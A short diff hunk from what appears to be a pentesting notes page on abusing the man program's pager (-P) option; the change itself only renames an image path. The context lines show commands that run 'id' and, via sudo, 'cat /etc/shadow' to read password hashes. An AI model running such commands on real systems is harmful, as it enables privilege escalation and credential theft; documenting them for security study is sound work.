@@ -12,7 +12,7 @@ Due to a quirk in the man program and how it handles the pager (-P) argument, we
 man -P "id" man
 ```
 
-![](<../../../.gitbook/assets/image (12) (1) (1) (1).png>)
+![](<../../../.gitbook/assets/image (12) (1) (1) (1) (1).png>)
 
 ```
 sudo man -P "cat /etc/shadow" man
